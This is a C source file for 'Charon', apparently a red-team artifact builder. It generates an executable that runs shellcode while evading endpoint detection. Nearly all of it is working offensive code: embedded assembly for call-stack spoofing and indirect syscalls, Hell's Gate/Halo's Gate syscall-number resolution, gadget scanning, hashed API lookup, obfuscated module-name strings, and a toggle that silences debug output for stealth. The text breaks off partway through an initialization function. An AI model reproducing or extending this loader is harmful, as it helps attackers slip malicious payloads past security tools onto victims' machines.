/*
 * ======================================================================================
 * Charon - Artifact Builder & Obfuscator
 * ======================================================================================
 *
 * Purpose:
 * Generates a standalone executable (CharonArtifact.exe) designed to
 * execute shellcode while evading EDR (Endpoint Detection and Response)
 * hooks.
 *
 * Key Techniques:
 *      1. Indirect Syscalls: Bypasses user-mode hooks by executing the
 *         'syscall' instruction within the memory space of ntdll.dll.
 *      2. Stack Spoofing (SilentMoonwalk): Manipulates the call stack to make
 *         syscalls appear as if they originated from legitimate APIs.
 *         It dynamically calculates the correct stack frame size for the
 *         spoofed return address to ensure stability and stealth.
 *      3. Dynamic Gadget Search: Scans loaded modules for 'jmp REG' gadgets
 *         across all non-volatile registers (RBX, RDI, RSI, R12-R15).
 *      4. Module Stomping: Injects the payload into the .text section of a
 *         legitimate DLL (e.g., Chakra.dll) to back the execution with a valid
 *         file on disk.
 *      5. Payload Protection: Uses RC4 encryption and 'KeyGuard' (runtime key
 *         calculation) to prevent static analysis of the payload.
 *      6. External UUID Staging: Decouples the payload from the main artifact
 *         by loading an external, UUID-encoded file. This bypasses static
 *         analysis of the executable while maintaining low entropy in the
 *         staged data.
 *
 * Author: vari.sh
 * ======================================================================================
 */

#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <windows.h>

// =================================================================================
//  PART 1: EMBEDDED ASSEMBLY (STACK SPOOFER & INDIRECT SYSCALL ENGINE)
// =================================================================================
// This string contains the assembly code that handles the low-level stack
// manipulation and system call execution. It is written to 'syscalls.asm' and
// compiled by ML64.
const char *g_HellHallAsm =
    "EXTERN qTableAddr:QWORD\n"
    "EXTERN qGadgetAddress:QWORD\n"
    "EXTERN qGadgetType:DWORD\n"
    "EXTERN qFrameSize:DWORD\n"
    "EXTERN qSavedReg:QWORD\n"
    "EXTERN qSavedRetAddr:QWORD\n"
    "EXTERN qActiveMaskAddress:QWORD\n"
    "EXTERN qChakraFunc:QWORD\n"
    "EXTERN qThreadBase:QWORD\n"
    "EXTERN qRtlUserThreadStart:QWORD\n"
    "EXTERN qActiveMaskFrame:DWORD\n"
    "EXTERN qChakraFuncFrame:DWORD\n"
    "EXTERN qThreadBaseFrame:DWORD\n"
    "EXTERN qRtlUserThreadStartFrame:DWORD\n"
    ".code\n"
    "\n"
    "    PUBLIC SetTableAddr\n"
    "    SetTableAddr PROC\n"
    "        mov qTableAddr, rcx\n"
    "        mov qGadgetAddress, rdx\n"
    "        mov qGadgetType, r8d\n"
    "        mov qFrameSize, r9d\n"
    "        xor rax, rax\n"
    "        inc rax\n"
    "        ret\n"
    "    SetTableAddr ENDP\n"
    "\n"
    "    SyscallExec PROC\n"
    "        mov r10, rcx\n"
    "        mov r11, rax\n"
    "\n"
    "        ; 1. PRESERVE REGISTERS SAFELY\n"
    "        ; Save RSI/RDI in the ORIGINAL caller's shadow space before "
    "moving RSP.\n"
    "        ; The kernel will never reach this high up the stack to clobber "
    "it.\n"
    "        mov [rsp + 8h], rsi\n"
    "        mov [rsp + 10h], rdi\n"
    "        mov [rsp + 18h], r8\n"
    "        mov [rsp + 20h], r9\n"
    "\n"
    "        ; 2. EXTENDED SYNTHETIC STACK SPOOFING\n"
    "        mov qSavedRetAddr, rsp\n"
    "        and rsp, 0FFFFFFFFFFFFFFF0h\n"
    "        \n"
    "        ; Correct total calculation: (FrameSize + 8) for each level\n"
    "        xor rax, rax\n"
    "        mov eax, qFrameSize\n"
    "        add eax, 8                           ; +8 bytes for Gadget Return "
    "Address\n"
    "        add eax, qActiveMaskFrame\n"
    "        add eax, 8                           ; +8 bytes for VPEx Return "
    "Address\n"
    "        add eax, qChakraFuncFrame\n"
    "        add eax, 8                           ; +8 bytes for Chakra Return "
    "Address\n"
    "        add eax, qThreadBaseFrame\n"
    "        add eax, 8                           ; +8 bytes for ThreadBase "
    "Return Address\n"
    "        add eax, qRtlUserThreadStartFrame\n"
    "        sub rsp, rax\n"
    "\n"
    "        ; Insert Return Addresses at exact frame boundaries\n"
    "        mov r8, rsp\n"
    "\n"
    "        xor rax, rax\n"
    "        mov eax, qFrameSize\n"
    "        mov r9, qActiveMaskAddress\n"
    "        mov [r8 + rax], r9\n"
    "\n"
    "        add eax, 8                           ; Skip the just written "
    "Return Address\n"
    "        add eax, qActiveMaskFrame\n"
    "        mov r9, qChakraFunc\n"
    "        mov [r8 + rax], r9\n"
    "\n"
    "        add eax, 8\n"
    "        add eax, qChakraFuncFrame\n"
    "        mov r9, qThreadBase\n"
    "        mov [r8 + rax], r9\n"
    "\n"
    "        add eax, 8\n"
    "        add eax, qThreadBaseFrame\n"
    "        mov r9, qRtlUserThreadStart\n"
    "        mov [r8 + rax], r9\n"
    "\n"
    "        add eax, 8\n"
    "        add eax, qRtlUserThreadStartFrame\n"
    "        xor r9, r9\n"
    "        mov [r8 + rax], r9\n"
    "\n"
    "        ; Restore R8/R9 for the syscall\n"
    "        mov r8, qSavedRetAddr\n"
    "        mov r9, [r8 + 20h]\n"
    "        mov r8, [r8 + 18h]\n"
    "\n"
    "        ; 3. DYNAMIC STACK ARGUMENTS COPY\n"
    "        mov rsi, qSavedRetAddr\n"
    "        add rsi, 28h\n"
    "        lea rdi, [rsp + 20h]\n"
    "        ; Copy 8 QWORDs (64 bytes) to support syscalls with up to 12 "
    "arguments.\n"
    "        ; Safe to do because we enforce a minFrameSize of 0x100 in the C "
    "builder.\n"
    "        mov rcx, 8\n"
    "        cld\n"
    "        rep movsq\n"
    "\n"
    "        ; Restore Syscall Index\n"
    "        mov rax, r11\n"
    "\n"
    "        cmp qGadgetType, 0\n"
    "        je UseRBX\n"
    "        cmp qGadgetType, 1\n"
    "        je UseRDI\n"
    "        cmp qGadgetType, 2\n"
    "        je UseRSI\n"
    "        cmp qGadgetType, 3\n"
    "        je UseR12\n"
    "        cmp qGadgetType, 4\n"
    "        je UseR13\n"
    "        cmp qGadgetType, 5\n"
    "        je UseR14\n"
    "        cmp qGadgetType, 6\n"
    "        je UseR15\n"
    "        jmp UseRBX\n"
    "\n"
    "    UseRBX:\n"
    "        mov qSavedReg, rbx\n"
    "        lea rbx, BackFromKernel\n"
    "        jmp DoCall\n"
    "    UseRDI:\n"
    "        ; We must fetch the saved RDI from the ORIGINAL shadow space\n"
    "        mov rdi, qSavedRetAddr\n"
    "        mov rdi, [rdi + 10h]\n"
    "        mov qSavedReg, rdi\n"
    "        lea rdi, BackFromKernel\n"
    "        jmp DoCall\n"
    "    UseRSI:\n"
    "        ; We must fetch the saved RSI from the ORIGINAL shadow space\n"
    "        mov rsi, qSavedRetAddr\n"
    "        mov rsi, [rsi + 8h]\n"
    "        mov qSavedReg, rsi\n"
    "        lea rsi, BackFromKernel\n"
    "        jmp DoCall\n"
    "    UseR12:\n"
    "        mov qSavedReg, r12\n"
    "        lea r12, BackFromKernel\n"
    "        jmp DoCall\n"
    "    UseR13:\n"
    "        mov qSavedReg, r13\n"
    "        lea r13, BackFromKernel\n"
    "        jmp DoCall\n"
    "    UseR14:\n"
    "        mov qSavedReg, r14\n"
    "        lea r14, BackFromKernel\n"
    "        jmp DoCall\n"
    "    UseR15:\n"
    "        mov qSavedReg, r15\n"
    "        lea r15, BackFromKernel\n"
    "        jmp DoCall\n"
    "\n"
    "    DoCall:\n"
    "        push rdx             ; Save Arg2\n"
    "        shl rax, 5           ; rax *= 32 (struct size)\n"
    "        mov rdx, qTableAddr\n"
    "        add rdx, rax\n"
    "        mov rax, [rdx + 08h] ; Load SSN\n"
    "        mov r11, [rdx + 10h] ; Load Syscall Instruction Address\n"
    "        pop rdx              ; Restore Arg2\n"
    "        mov rcx, r10         ; Restore Arg1\n"
    "        push qGadgetAddress  ; RSP drops by 8, finalizing the perfect "
    "frame size\n"
    "        jmp r11              ; Execute indirect syscall\n"
    "\n"
    "    BackFromKernel:\n"
    "        cmp qGadgetType, 0\n"
    "        je RestRBX\n"
    "        cmp qGadgetType, 1\n"
    "        je RestRDI\n"
    "        cmp qGadgetType, 2\n"
    "        je RestRSI\n"
    "        cmp qGadgetType, 3\n"
    "        je RestR12\n"
    "        cmp qGadgetType, 4\n"
    "        je RestR13\n"
    "        cmp qGadgetType, 5\n"
    "        je RestR14\n"
    "        cmp qGadgetType, 6\n"
    "        je RestR15\n"
    "        jmp RestRBX\n"
    "\n"
    "    RestRBX:\n"
    "        mov rbx, qSavedReg\n"
    "        jmp Fin\n"
    "    RestRDI:\n"
    "        mov rdi, qSavedReg\n"
    "        jmp Fin\n"
    "    RestRSI:\n"
    "        mov rsi, qSavedReg\n"
    "        jmp Fin\n"
    "    RestR12:\n"
    "        mov r12, qSavedReg\n"
    "        jmp Fin\n"
    "    RestR13:\n"
    "        mov r13, qSavedReg\n"
    "        jmp Fin\n"
    "    RestR14:\n"
    "        mov r14, qSavedReg\n"
    "        jmp Fin\n"
    "    RestR15:\n"
    "        mov r15, qSavedReg\n"
    "        jmp Fin\n"
    "\n"
    "    Fin:\n"
    "        mov rcx, rax         ; Save Syscall Status\n"
    "        \n"
    "        ; Restore real RSP\n"
    "        mov rsp, qSavedRetAddr\n"
    "        \n"
    "        ; Restore registers from the original caller's shadow space\n"
    "        mov rsi, [rsp + 8h]\n"
    "        mov rdi, [rsp + 10h]\n"
    "        \n"
    "        mov rax, rcx         ; Restore Status\n"
    "        ret                  ; Return cleanly to caller\n"
    "    SyscallExec ENDP\n"
    "\n"
    "    PUBLIC JumpToPayload\n"
    "    JumpToPayload PROC\n"
    "        mov r10, rcx            ; Save payload address in r10\n"
    "        \n"
    "        ; Wipe \"Trailing Bytes\" (below current RSP)\n"
    "        mov rdi, rsp\n"
    "        sub rdi, 1024           ; Start 1024 bytes BELOW the current "
    "stack pointer\n"
    "        mov rcx, 128            ; 128 QWORDs (1024 bytes)\n"
    "        xor rax, rax\n"
    "        cld\n"
    "        rep stosq               ; Zero out moving up to RSP, removing "
    "artifacts\n"
    "        \n"
    "        ; Re-alignment and shadow space for the payload\n"
    "        and rsp, 0FFFFFFFFFFFFFFF0h\n"
    "        sub rsp, 28h            ; 32 bytes of Shadow Space + 8 bytes for "
    "alignment\n"
    "        jmp r10                 ; Clean execution handover\n"
    "    JumpToPayload ENDP\n";

// =================================================================================
//  PART 2: MONOLITHIC C TEMPLATE (THE ARTIFACT)
// =================================================================================
// This string contains the source code for the generated artifact.
// It is written to 'artifact.c' and compiled.
const char *g_StubTemplate =
    // Headers
    "#include <windows.h>\n"
    "#include <stdio.h>\n"
    "#include <string.h>\n"
    // "#include \"sqlite-amalgamation-3510200/sqlite3.h\"\n"
    "\n"
    "#define INVALID_SSN ((DWORD64)-1)\n"
    "#define DEFAULT_FRAME_SIZE 0x28\n"
    "\n"
    // --- OPSEC TOGGLE ---
    // Comment the line below to enable debug prints
    "#define printf(...) \n"
    "\n"
    // Syscall Wrapper Macro
    "#define ExecuteSyscall(func_ptr, mask, ...) ( \\\n"
    "    qActiveMaskAddress = (mask).pAddress, \\\n"
    "    qActiveMaskFrame = (mask).dwFrameSize, \\\n"
    "    func_ptr(__VA_ARGS__) \\\n"
    ")\n"
    "\n"

    // -------------------------------------------------------------------------
    // [SECTION 1] GLOBALS FOR ASM
    // These globals bridge the C code and the Assembly engine.
    // -------------------------------------------------------------------------
    "void* qTableAddr = NULL;\n"     // Base address of the syscall table
    "void* qGadgetAddress = NULL;\n" // Address of the found 'jmp REG' gadget
    "DWORD qGadgetType = 0;\n"      // Type of gadget found (0=RBX, 1=RDI, etc.)
    "DWORD qFrameSize = 0;\n"       // Spoofed Frame Size\n"
    "void* qSavedReg = NULL;\n"     // Space to save the register context\n"
    "void* qSavedRetAddr = NULL;\n" // Space to save the return address\n"
    "void* qActiveMaskAddress = NULL;\n"
    "void* qChakraFunc = NULL;\n"
    "void* qThreadBase = NULL;\n"
    "void* qRtlUserThreadStart = NULL;\n"
    "DWORD qActiveMaskFrame = 0;\n"
    "DWORD qChakraFuncFrame = 0;\n"
    "DWORD qThreadBaseFrame = 0;\n"
    "DWORD qRtlUserThreadStartFrame = 0;\n"
    "\n"

    // Define a structure to hold our dynamic masks
    "typedef struct _DYNAMIC_MASK {\n"
    "    PVOID pAddress;\n"
    "    DWORD dwFrameSize;\n"
    "} DYNAMIC_MASK, *PDYNAMIC_MASK;\n"
    "\n"

    // Global masks to be initialized in InitApi
    "DYNAMIC_MASK Mask_Memory;   // MapViewOfFile\n"
    "DYNAMIC_MASK Mask_File;     // CreateFileW\n"
    "DYNAMIC_MASK Mask_Security; // VirtualProtectEx\n"
    "DYNAMIC_MASK Mask_Worker;   // BaseThreadInitThunk\n"
    "\n"

    // -------------------------------------------------------------------------
    // [SECTION 2] INTERNAL STRUCTS
    // -------------------------------------------------------------------------
    // UNWIND_CODE structure for stack walking
    "typedef struct _UNWIND_CODE {\n"
    "    BYTE CodeOffset;\n"
    "    BYTE UnwindOp : 4;\n"
    "    BYTE OpInfo : 4;\n"
    "} UNWIND_CODE, *PUNWIND_CODE;\n"
    "\n"
    // UNWIND_INFO structure
    "typedef struct _UNWIND_INFO {\n"
    "    BYTE Version : 3;\n"
    "    BYTE Flags : 5;\n"
    "    BYTE SizeOfProlog;\n"
    "    BYTE CountOfCodes;\n"
    "    BYTE FrameRegister : 4;\n"
    "    BYTE FrameOffset : 4;\n"
    "    UNWIND_CODE UnwindCode[1];\n"
    "} UNWIND_INFO, *PUNWIND_INFO;\n"
    "\n"
    // Syscall Entry structure
    "typedef struct _SYSCALL_ENTRY {\n"
    "    PVOID pAddress;      // 0x00 - Original Address\n"
    "    DWORD64 dwSsn;       // 0x08 - Syscall Number (SSN)\n"
    "    PVOID pSyscallRet;   // 0x10 - Address of 'syscall; ret' instruction\n"
    "    DWORD64 dwHash;      // 0x18 - Hash of the function name\n"
    "} SYSCALL_ENTRY, *PSYSCALL_ENTRY;\n"
    "\n"
    // Syscall List
    "typedef struct _SYSCALL_LIST {\n"
    "    DWORD Count;\n"
    "    SYSCALL_ENTRY Entries[512];\n"
    "} SYSCALL_LIST, *PSYSCALL_LIST;\n"
    "\n"
    // Native definitions needed for traversing PEB (Process Environment Block)
    "typedef struct _USTRING { DWORD Length; DWORD MaximumLength; PVOID "
    "Buffer; } USTRING, *PUSTRING;\n"
    "typedef struct _PEB_LDR_DATA { ULONG Length; BOOLEAN Initialized; HANDLE "
    "SsHandle; LIST_ENTRY InLoadOrderModuleList; } PEB_LDR_DATA, "
    "*PPEB_LDR_DATA;\n"
    "typedef struct _LDR_DATA_TABLE_ENTRY { LIST_ENTRY InLoadOrderLinks; "
    "LIST_ENTRY InMemoryOrderLinks; LIST_ENTRY InInitializationOrderLinks; "
    "PVOID DllBase; } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;\n"
    "typedef struct _PEB { BYTE Reserved[24]; PPEB_LDR_DATA Ldr; } PEB, "
    "*PPEB;\n"
    "\n"

    // --- GLOBALS ---\n"
    "SYSCALL_LIST SyscallList;\n"
    "PVOID g_pSystemFunction032 = NULL;\n"
    "PVOID g_pLoadLibraryExA = NULL;\n"
    "extern void SetTableAddr(PVOID pTable, PVOID pGadget, DWORD dwType, DWORD "
    "dwFrameSize);\n"
    "extern void Fnc0000(); // Reference to the base of the assembly stubs\n"
    "extern void JumpToPayload(PVOID pAddr); // Jump to payload with stack "
    "wipe\n"
    "\n"
    // Decodes a raw UUID string (fixed 36 chars) into 16 bytes.
    // Format: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
    "void UUIDToBytes(const char* uuidStr, unsigned char* outBuf) {\n"
    "    int byteIdx = 0;\n"
    "    for (int i = 0; i < 36; i++) {\n"
    "        if (uuidStr[i] == '-') continue;\n"
    "\n"
    "        char c = uuidStr[i];\n"
    "        unsigned char val = 0;\n"
    "\n"
    "        if (c >= '0' && c <= '9') val = c - '0';\n"
    "        else if (c >= 'A' && c <= 'F') val = c - 'A' + 10;\n"
    "        else if (c >= 'a' && c <= 'f') val = c - 'a' + 10;\n"
    "\n"
    "        if (byteIdx % 2 == 0) {\n"
    "            outBuf[byteIdx / 2] = val << 4; // High nibble\n"
    "        } else {\n"
    "            outBuf[byteIdx / 2] |= val;     // Low nibble\n"
    "        }\n"
    "        byteIdx++;\n"
    "    }\n"
    "}\n"
    "\n"

    // --- [SECTION 3] HELPERS ---\n"

    // djb2: Simple hash function for string comparison
    "DWORD64 djb2(PBYTE str) {\n"
    "    DWORD64 dwHash = 0x7734773477347734;\n"
    "    INT c;\n"
    "    while (c = (INT)((char)*str++)) dwHash = ((dwHash << 0x5) + dwHash) + "
    "c;\n"
    "    return dwHash;\n"
    "}\n"
    "\n"
    // GetNextSyscallInstruction: Scans forward to find valid 'syscall; ret'
    // bytes
    "PVOID GetNextSyscallInstruction(PVOID pAddress) {\n"
    "    for (DWORD i = 0; i <= 32; i++) {\n"
    "        if (*((PBYTE)pAddress + i) == 0x0f && *((PBYTE)pAddress + i + 1) "
    "== 0x05 && *((PBYTE)pAddress + i + 2) == 0xc3) {\n"
    "            return (PVOID)((ULONG_PTR)pAddress + i);\n"
    "        }\n"
    "    }\n"
    "    return NULL;\n"
    "}\n"
    "\n"
    // GetSSN: Extracts the System Service Number from a function address or its
    // neighborhood
    "DWORD64 GetSSN(PVOID pAddress) {\n"
    "    if (*((PBYTE)pAddress) == 0x4c && *((PBYTE)pAddress + 3) == 0xb8) "
    "return *(DWORD*)((PBYTE)pAddress + 4);\n"
    "    for (WORD idx = 1; idx <= 32; idx++) {\n"
    "        // Check neighbors if the function is hooked\n"
    "        if (*((PBYTE)pAddress + idx * 32) == 0x4c && *((PBYTE)pAddress + "
    "idx * 32 + 3) == 0xb8)\n"
    "            return *((PBYTE)pAddress + idx * 32 + 4) - idx;\n"
    "        if (*((PBYTE)pAddress - idx * 32) == 0x4c && *((PBYTE)pAddress - "
    "idx * 32 + 3) == 0xb8)\n"
    "            return *((PBYTE)pAddress - idx * 32 + 4) + idx;\n"
    "    }\n"
    "    return INVALID_SSN;\n"
    "}\n"
    "\n"
    // -----------------------------------------------------------------------
    "typedef PRUNTIME_FUNCTION (NTAPI *fnRtlLookupFunctionEntry)(DWORD64 "
    "ControlPc, PDWORD64 ImageBase, PUNWIND_HISTORY_TABLE HistoryTable);\n"
    "\n"
    // -----------------------------------------------------------------------
    // SeekReturnAddress: Scans a function's memory looking for a CALL
    // instruction
    // to use as a spoofed return address, avoiding hardcoded offsets.
    // -----------------------------------------------------------------------
    "PVOID SeekReturnAddress(PVOID pBase) {\n"
    "    if (!pBase) return NULL;\n"
    "    \n"
    "    PBYTE pBytes = (PBYTE)pBase;\n"
    "    \n"
    "    // Scan up to 256 bytes deep into the function body\n"
    "    for (int i = 0; i < 256; i++) {\n"
    "        // Look for 'CALL QWORD PTR [RIP+offset]' (Opcode: FF 15)\n"
    "        if (pBytes[i] == 0xFF && pBytes[i+1] == 0x15) {\n"
    "            // The instruction is 6 bytes long. The return address is "
    "immediately after.\n"
    "            return (PVOID)(pBytes + i + 6);\n"
    "        }\n"
    "        \n"
    "        // Look for relative 'CALL' (Opcode: E8)\n"
    "        if (pBytes[i] == 0xE8) {\n"
    "            // The instruction is 5 bytes long.\n"
    "            return (PVOID)(pBytes + i + 5);\n"
    "        }\n"
    "    }\n"
    "    \n"
    "    // Fallback to the function prologue if no CALL is found.\n"
    "    return pBase;\n"
    "}\n"
    "\n"
    // -----------------------------------------------------------------------
    // CalcFrameSize: Calculates the stack frame size of a target function.
    // -----------------------------------------------------------------------
    // This function parses the .pdata (Exception Directory) of a module to find
    // the UNWIND_INFO for a given function. It then iterates through the unwind
    // codes to calculate exactly how much stack space the function allocates.
    //
    // We use this to 'spoof' a legitimate stack frame size. By making our
    // malicious syscall stack look exactly like a call from
    // 'BaseThreadInitThunk' or similar, we blend in with normal execution flow.
    "DWORD CalcFrameSize(PVOID pFunc) {\n"
    "    char sK32[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};\n"
    "    char sRtl[] = "
    "{'R','t','l','L','o','o','k','u','p','F','u','n','c','t','i','o','n','E','"
    "n','t','r','y',0};\n"
    "    \n"
    "    PVOID pH = GetProcAddress(GetModuleHandleA(sK32), sRtl);\n"
    "    if(!pH) return DEFAULT_FRAME_SIZE;\n"
    "    \n"
    "    fnRtlLookupFunctionEntry RtlLookup = (fnRtlLookupFunctionEntry)pH;\n"
    "    DWORD64 ImageBase;\n"
    "    PRUNTIME_FUNCTION pRF = RtlLookup((DWORD64)pFunc, &ImageBase, NULL);\n"
    "    \n"
    "    if(!pRF) return DEFAULT_FRAME_SIZE;\n"
    "    \n"
    "    DWORD totalSize = 0;\n"
    "    \n"
    "    // Loop to support chained unwind info (UNW_FLAG_CHAININFO)\n"
    "    while (pRF) {\n"
    "        PUNWIND_INFO pUI = (PUNWIND_INFO)(ImageBase + pRF->UnwindData);\n"
    "        \n"
    "        for(int i = 0; i < pUI->CountOfCodes; i++) {\n"
    "            UNWIND_CODE* pCode = &pUI->UnwindCode[i];\n"
    "            BYTE op = pCode->UnwindOp;\n"
    "            BYTE info = pCode->OpInfo;\n"
    "            \n"
    "            if (op == 0) {\n"
    "                totalSize += 8;\n"
    "            } \n"
    "            else if (op == 1) {\n"
    "                if (info == 0) { \n"
    "                    totalSize += (*(USHORT*)&pUI->UnwindCode[i+1]) * 8; \n"
    "                    i += 1;\n"
    "                }\n"
    "                else { \n"
    "                    totalSize += *(DWORD*)&pUI->UnwindCode[i+1]; \n"
    "                    i += 2;\n"
    "                }\n"
    "            } \n"
    "            else if (op == 2) {\n"
    "                totalSize += (info * 8) + 8;\n"
    "            } \n"
    "            else if (op == 3) {\n"
    "            } \n"
    "            else if (op == 4) {\n"
    "                i += 1;\n"
    "            } \n"
    "            else if (op == 5) {\n"
    "                i += 2;\n"
    "            } \n"
    "            else if (op == 8) {\n"
    "                i += 1;\n"
    "            } \n"
    "            else if (op == 9) {\n"
    "                i += 2;\n"
    "            } \n"
    "            else if (op == 10) {\n"
    "                totalSize += (info == 0) ? 40 : 48;\n"
    "            }\n"
    "        }\n"
    "        \n"
    "        if (pUI->Flags & 0x04) {\n"
    "            int chainedOffset = (pUI->CountOfCodes + 1) & ~1;\n"
    "            pRF = (PRUNTIME_FUNCTION)(&pUI->UnwindCode[chainedOffset]);\n"
    "        } else {\n"
    "            break;\n"
    "        }\n"
    "    }\n"
    "    \n"
    "    if(totalSize % 16 != 0) totalSize = (totalSize + 16) & ~15;\n"
    "    \n"
    "    return totalSize;\n"
    "}\n"
    // FindGadgetInModule: Scans a module for 'jmp REG' opcodes to use for stack
    // spoofing
    "PVOID FindValidGadgetInModule(const char* sModule, DWORD* outType, DWORD "
    "minFrameSize, DWORD* actualFrameSize) {\n"
    "    PVOID pModule = (PVOID)GetModuleHandleA(sModule);\n"
    "    if (!pModule) return NULL;\n"
    "    \n"
    "    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModule;\n"
    "    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((ULONG_PTR)pModule + "
    "pDos->e_lfanew);\n"
    "    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);\n"
    "    \n"
    "    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {\n"
    "        // Check for Executable section (IMAGE_SCN_MEM_EXECUTE)\n"
    "        if (pSection[i].Characteristics & 0x20000020) {\n"
    "            PBYTE pStart = (PBYTE)((ULONG_PTR)pModule + "
    "pSection[i].VirtualAddress);\n"
    "            DWORD dwSize = pSection[i].Misc.VirtualSize;\n"
    "            \n"
    "            for (DWORD z = 0; z < dwSize - 2; z++) {\n"
    "                DWORD currentType = (DWORD)-1;\n"
    "                \n"
    "                // Identify the gadget type based on opcodes\n"
    "                if (pStart[z] == 0xFF && pStart[z+1] == 0xE3) currentType "
    "= 0;\n"
    "                else if (pStart[z] == 0xFF && pStart[z+1] == 0xE7) "
    "currentType = 1;\n"
    "                else if (pStart[z] == 0xFF && pStart[z+1] == 0xE6) "
    "currentType = 2;\n"
    "                else if (pStart[z] == 0x41 && pStart[z+1] == 0xFF && "
    "pStart[z+2] == 0xE4) currentType = 3;\n"
    "                else if (pStart[z] == 0x41 && pStart[z+1] == 0xFF && "
    "pStart[z+2] == 0xE5) currentType = 4;\n"
    "                else if (pStart[z] == 0x41 && pStart[z+1] == 0xFF && "
    "pStart[z+2] == 0xE6) currentType = 5;\n"
    "                else if (pStart[z] == 0x41 && pStart[z+1] == 0xFF && "
    "pStart[z+2] == 0xE7) currentType = 6;\n"
    "                \n"
    "                // If a gadget is found, calculate its actual frame size\n"
    "                if (currentType != (DWORD)-1) {\n"
    "                    PVOID pCandidate = (PVOID)(pStart + z);\n"
    "                    DWORD frameSize = CalcFrameSize(pCandidate);\n"
    "                    \n"
    "                    // Only return if the frame size is large enough to "
    "prevent stack corruption\n"
    "                    if (frameSize >= minFrameSize) {\n"
    "                        *outType = currentType;\n"
    "                        *actualFrameSize = frameSize;\n"
    "                        return pCandidate;\n"
    "                    }\n"
    "                }\n"
    "            }\n"
    "        }\n"
    "    }\n"
    "    return NULL; // Return NULL if no suitable gadget is found in the "
    "entire module\n"
    "}\n"
    "\n"
    "typedef HMODULE (WINAPI *fnLoadLibraryExA)(LPCSTR, HANDLE, DWORD);\n"
    "\n"
    // Helper to find export by hash
    "PVOID GetProcAddressByHash(HMODULE hMod, DWORD64 hHash) {\n"
    "    if (!hMod) return NULL;\n"
    "    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hMod;\n"
    "    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hMod + "
    "pDos->e_lfanew);\n"
    "    PIMAGE_EXPORT_DIRECTORY pExport = "
    "(PIMAGE_EXPORT_DIRECTORY)((PBYTE)hMod + "
    "pNt->OptionalHeader.DataDirectory[0].VirtualAddress);\n"
    "    DWORD dwExportSize = pNt->OptionalHeader.DataDirectory[0].Size;\n"
    "    PBYTE pExportBase = (PBYTE)pExport;\n"
    "    PBYTE pExportEnd = pExportBase + dwExportSize;\n"
    "    PDWORD pdwFunctions = (PDWORD)((PBYTE)hMod + "
    "pExport->AddressOfFunctions);\n"
    "    PDWORD pdwNames = (PDWORD)((PBYTE)hMod + pExport->AddressOfNames);\n"
    "    PWORD pwOrdinals = (PWORD)((PBYTE)hMod + "
    "pExport->AddressOfNameOrdinals);\n"
    "    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {\n"
    "        char* szName = (char*)((PBYTE)hMod + pdwNames[i]);\n"
    "        if (djb2((PBYTE)szName) == hHash) {\n"
    "            PVOID pFunc = (PBYTE)hMod + pdwFunctions[pwOrdinals[i]];\n"
    "            if (pFunc >= (PVOID)pExport && pFunc < (PVOID)((PBYTE)pExport "
    "+ dwExportSize)) {\n"
    "                 // Forwarded export: DLL.Function\n"
    "                 char szFwd[260]; strncpy(szFwd, (char*)pFunc, 260);\n"
    "                 char* pDot = strchr(szFwd, '.');\n"
    "                 if(pDot) {\n"
    "                     *pDot = 0;\n"
    "                     char szDll[260]; sprintf(szDll, \"%s.dll\", szFwd);\n"
    "                     if (g_pLoadLibraryExA) {\n"
    "                         return "
    "GetProcAddress(((fnLoadLibraryExA)g_pLoadLibraryExA)(szDll, NULL, 0), "
    "pDot + 1);\n"
    "                     }\n"
    "                     return NULL;\n"
    "                 }\n"
    "            }\n"
    "            return pFunc;\n"
    "        }\n"
    "    }\n"
    "    return NULL;\n"
    "}\n"
    "\n"

    // -------------------------------------------------------------------------
    // [SECTION 4] INIT ENGINE
    // -------------------------------------------------------------------------
    // -----------------------------------------------------------------------
    // InitApi: Initializes the Evasion Engine.
    // -----------------------------------------------------------------------
    // 1. Locates Ntdll.dll base address.
    // 2. Finds a suitable 'jmp REG' gadget for stack spoofing.
    // 3. Calculates the frame size of a legitimate function to mimic.
    // 4. Resolves syscall numbers (SSNs) via Hell's Gate/Halo's Gate.
    "BOOL InitApi() {\n"
    "    char sNt[] = {'n','t','d','l','l','.','d','l','l',0};\n"
    "    PVOID ntdllBase = GetModuleHandleA(sNt);\n"
    "    if(!ntdllBase) return FALSE;\n"
    "    \n"
    "    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)ntdllBase;\n"
    "    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;\n"
    "    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)ntdllBase + "
    "pDos->e_lfanew);\n"
    "    if (pNt->Signature != IMAGE_NT_SIGNATURE) return FALSE;\n"
    "    \n"
    "    PIMAGE_EXPORT_DIRECTORY pExport = "
    "(PIMAGE_EXPORT_DIRECTORY)((PBYTE)ntdllBase + "
    "pNt->OptionalHeader.DataDirectory[0].VirtualAddress);\n"
    "    PDWORD pdwFunctions = (PDWORD)((PBYTE)ntdllBase + "
    "pExport->AddressOfFunctions);\n"
    "    PDWORD pdwNames = (PDWORD)((PBYTE)ntdllBase + "
    "pExport->AddressOfNames);\n"
    "    PWORD pwOrdinals = (PWORD)((PBYTE)ntdllBase + "
    "pExport->AddressOfNameOrdinals);\n"
    "    \n"
    "    DWORD idx = 0;\n"
    "    \n"
    // [STEP 1] Find Stack Spoof Gadget
    // We look for 'jmp RBX', 'jmp RDI', etc. in kernel32 or ntdll.
    // This gadget allows us to jump to the syscall instruction while
    // controlling registers.
    "    char sK32[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};\n"
    "    \n"
    "    char sNtdll[] = {'n','t','d','l','l','.','d','l','l',0};\n"
    "    char sKBase[] = "
    "{'k','e','r','n','e','l','b','a','s','e','.','d','l','l',0};\n"
    "    Mask_Security.pAddress = "
    "SeekReturnAddress(GetProcAddress(GetModuleHandleA(sKBase), "
